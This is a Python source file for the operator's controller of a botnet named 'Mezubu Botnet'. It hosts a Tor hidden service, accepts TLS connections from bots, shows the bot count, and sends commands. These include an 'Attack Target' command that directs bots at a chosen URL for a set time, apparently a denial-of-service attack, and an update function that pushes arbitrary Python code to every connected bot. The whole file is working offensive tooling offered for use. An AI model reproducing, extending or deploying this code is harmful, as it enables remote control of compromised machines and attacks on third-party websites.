import hashlib
import socket, socks
import threading
from tkinter import *
from tkinter import messagebox
from tkinter import filedialog
from stem.control import Controller
from PIL import ImageTk, Image
from os import getcwd, path
import ssl
import string, random
import subprocess
from time import sleep
import vlc
import validators

numberOfBotsList = list()
tor_password = "PUT_THE_TOR_PASSWORD_HERE"
server_password = "PUT_YOUR_MEZUBU_HASHED_PASSWORD_HERE"
hidden_service_dir = getcwd() + '/tor_server/tor/hidden_service_dir'


class Mezubu:
	def __init__(self):
		self.password = Tk()
		self.password_interface()

	def password_interface(self):
		self.password.geometry("300x100")
		self.password.wm_iconphoto(True, PhotoImage(height=16, width=16))
		self.password.title("Password Menu")
		self.password.configure(bg="#303030")
		self.password.resizable(False, False)
		label_password = Label(self.password, text="Password:", width=60, height=2, bg="#303030", fg='#ffffff')
		entry_password = Entry(self.password, width=70, bg="#303030", fg='#ffffff', show="*")
		button_submit = Button(self.password, text="Submit", fg='#ffffff', command=lambda: self.test_password(entry_password.get()), width=60, height=3, bg="#383838")
		label_password.pack()
		entry_password.pack()
		button_submit.pack()
		self.password.mainloop()

	def tor_control(self):
		def boot_tor():
			while not self.torStarted:
				subprocess.Popen("pkill -f './tor -f tor_server/torrc'", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT).wait()
				proc2 = subprocess.Popen(["./tor", "-f", "tor_server/torrc"], stdout=subprocess.PIPE)
				for lines in proc2.stdout:
					print(lines.decode("utf-8").strip())
					if lines.decode("utf-8").find("[notice] Bootstrapped 100% (done): Done") != -1:
						self.torStarted = True
						break
					elif lines.decode("utf-8").find("[err] Reading config failed--see warnings above.") != -1:
						self.torStarted = False

		def connect_to_tor():
			with Controller.from_port(port=9151) as controller:
				controller.authenticate(password=tor_password)
				hidden_service = path.join(controller.get_conf('DataDirectory', getcwd()), 'hidden_service_dir')
				controller.create_hidden_service(hidden_service, 80, target_port=5000)
				server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
				server.bind(("0.0.0.0", 5000))
				server.listen(0)
				while True:
					client_socket, addr = server.accept()
					client_thread = threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True)
					client_thread.start()
		boot_tor()
		connect_to_tor()

	def central(self):
		self.password.destroy()
		try:
			self.torStarted = False
			threading.Thread(target=self.tor_control, daemon=True).start()
			while not self.torStarted:
				sleep(5)
			alive = threading.Thread(target=self.keep_alive, daemon=True)
			alive.start()
			self.setup_main_window()
			self.main.mainloop()
		except KeyboardInterrupt:
			self.quit()

	def setup_main_window(self):
		self.main = Tk()
		self.main.attributes('-zoomed', True)
		self.setup_main_window_properties()
		self.create_main_buttons()
		self.main.bind("<Configure>", self.resize_menu)

	def setup_main_window_properties(self):
		self.width, self.height = 650, 837
		self.aspect_ratio_1, self.aspect_ratio_2 = self.width/self.height, self.height/self.width
		self.main.geometry(f"{self.width}x{self.height}")
		self.main.title("Mezubu Botnet")
		self.main.configure(bg="#303030")
		img = Image.open("mezubu.jpg")
		self.image = ImageTk.PhotoImage(img)
		self.label = Label(self.main, image=self.image)
		self.img_copy = img.copy()
		self.label.bind('<Configure>', self.resize_image)
		self.label.grid(row=0, column=0, sticky="nswe")

	def create_main_buttons(self):
		buttons = [
			("Attack Target", self.attack_menu),
			("Show Hostname", self.show_hostname_menu),
			("Number of Bots", self.number_of_bots_menu),
			("Play a song", 0),
			("Update Mezubu Botnet", self.select_file),
			("Quit", self.quit)
		]
		for i, (text, command) in enumerate(buttons):
			button = Button(self.main, text=text, fg='#ffffff', command=command, height=1, width=91, bg="#383838")
			button.grid(row=i+1, column=0, sticky="ew")
			if text == "Play a song":
				button.config(command=lambda btn=button: self.song(btn))
		self.main.grid_columnconfigure(0, weight=1)
		self.main.grid_rowconfigure(tuple(range(len(buttons) + 1)), weight=1)

	def number_of_bots_menu(self):
		for _ in range(3):
			self.message_sender(self.get_random_string())
		botMenu = Tk()
		botMenu.geometry("247x39")
		botMenu.title("Bot menu")
		botMenu.configure(bg="#303030")
		botMenu.resizable(False, False)
		Label(botMenu, fg='#ffffff', text="Number Of Bots : " + str(len(numberOfBotsList)), width=60, height=2, bg="#303030").pack()
		botMenu.mainloop()

	def show_hostname_menu(self):
		host = open(hidden_service_dir + "/hostname", "r").read().strip()
		hostname = Tk()
		hostname.geometry("500x100")
		hostname.title("Hostname Menu")
		hostname.configure(bg="#303030")
		hostname.resizable(False, False)
		Label(hostname, text="Hostname", width=60, height=2, bg="#303030", fg='#ffffff').pack()
		hostname_entry = Entry(hostname, width=70, bg="#303030", fg='#ffffff')
		hostname_entry.insert(0,host)
		hostname_entry.pack()
		hostname.mainloop()

	def attack_menu(self):
		attack = Tk()
		attack.geometry("300x180")
		attack.title("Attack Menu")
		attack.configure(bg="#303030")
		attack.resizable(False, False)
		Label(attack, text="Set target address [ https://example.com ]:", width=60, height=2, bg="#303030", fg='#ffffff').pack()
		target_address = Entry(attack, width=70, bg="#303030", fg='#ffffff')
		target_address.pack()
		Label(attack, text="Set time in seconds:", width=60, height=2, bg="#303030", fg='#ffffff').pack()
		time = Entry(attack, width=70, bg="#303030", fg='#ffffff')
		time.pack()
		Button(attack, text="Attack Target", fg='#ffffff', command=lambda: self.attack_target(target_address.get(), time.get()), width=60, height=3, bg="#383838").pack()
		attack.mainloop()

	def song(self, button: Button):
		def play(beat):
			instance = vlc.Instance('-I qt')
			player = instance.media_player_new()
			media = instance.media_new(beat)
			player.set_media(media)
			player.play()
			while True:
				state = player.get_state()
				if state == vlc.State.Ended:
					player = vlc.MediaPlayer(beat)
					player.play()
		button.config(state="disabled")
		threading.Thread(target=play, args=("beat.mp3",), daemon=True).start()

	def resize_menu(self, event: Event):
		if event.widget.master:
			return
		new_width_1 = event.width
		new_height_1 = int(new_width_1 / self.aspect_ratio_1)
		new_height_2 = event.height
		new_width_2 = int(new_height_2 / self.aspect_ratio_2)
		if abs(new_width_1 - self.width) > 10 or abs(new_height_1 - self.height) > 10:
			self.width = new_width_1
			self.height = new_height_1
		elif abs(new_height_2 - self.width) > 10 or abs(new_height_2 - self.height) > 10:
			self.width = new_width_2
			self.height = new_height_2
		self.main.geometry(f"{self.width}x{self.height}")

	def resize_image(self, event: Event):
		new_width = event.width
		new_height = event.height
		self.image = self.img_copy.resize((new_width, new_height))
		self.background_image = ImageTk.PhotoImage(self.image)
		self.label.configure(image = self.background_image)

	def get_random_string(self):
		random_characters = string.ascii_letters + string.digits
		return ''.join(random.choices(random_characters, k=128)).encode()

	def handle_client(self, client_socket: socket.socket):
		client_socket.settimeout(120)
		context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
		context.check_hostname = False
		context.verify_mode = ssl.CERT_NONE
		context.load_verify_locations('cert.pem', 'cert.key')
		my_socket = context.wrap_socket(client_socket, server_side=True)
		numberOfBotsList.append(my_socket)
		print("Connected!")

	def test_password(self, user_p : str):
		user_p = user_p.encode("utf-8")
		hash_object = hashlib.sha256(user_p)
		password_hash = hash_object.hexdigest()
		if server_password == password_hash:
			self.user_password = user_p
			self.central()
		else:
			messagebox.showerror("Error", "Invalid Password!")

	def quit(self):
		self.message_sender(self.get_random_string() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string() + b"|QUIT|" + self.get_random_string())
		exit(0)

	def select_file(self):
		filetypes = (
			('text files', '*.py'),
			('All files', '*.*')
		)

		filename = filedialog.askopenfilename(
			title='Open a file',
			initialdir='/',
			filetypes=filetypes)
		try:
			if filename.find(".py") != -1:
				with open(filename, "rb") as f:
					size = path.getsize(filename)
					bytes_read = f.read(size)
					self.message_sender(self.get_random_string() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string() + b"|UPDATE|" + str(size).encode() + b"|UPDATE|" + self.get_random_string())
					messagebox.showinfo("Update", "Updating...", icon="info")
					for x in numberOfBotsList:
						try:
							x.sendall(bytes_read)
						except ssl.SSLEOFError:
							numberOfBotsList.remove(x)
				messagebox.showinfo("Update", "Update sent succefully!", icon="info")
			else:
				messagebox.showinfo("Update", "Update failed!", icon="warning")
		except Exception:
			pass

	def attack_target(self, target: str, time: str):
		target = target[:9] + target[9:].split("/")[0]
		if validators.url(target) and time.isnumeric() and int(time) > 0:
			self.message_sender(self.get_random_string() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string() + b"|ATTACK|" + target.encode() + b"|ATTACK|" + self.get_random_string() + b"|ATTACK|" + time.encode() + b"|ATTACK|" + self.get_random_string())
			messagebox.showinfo("Attack", "Attack started successfully!", icon="warning")
		else:
			messagebox.showinfo("Attack", "Attack didn't start!", icon="error")

	def keep_alive(self):
		while True:
			sleep(60)
			self.message_sender(self.get_random_string())

	def message_sender(self, message):
		for x in numberOfBotsList:
			try:
				x.send(message)
			except ssl.SSLEOFError:
				numberOfBotsList.remove(x)


app = Mezubu()
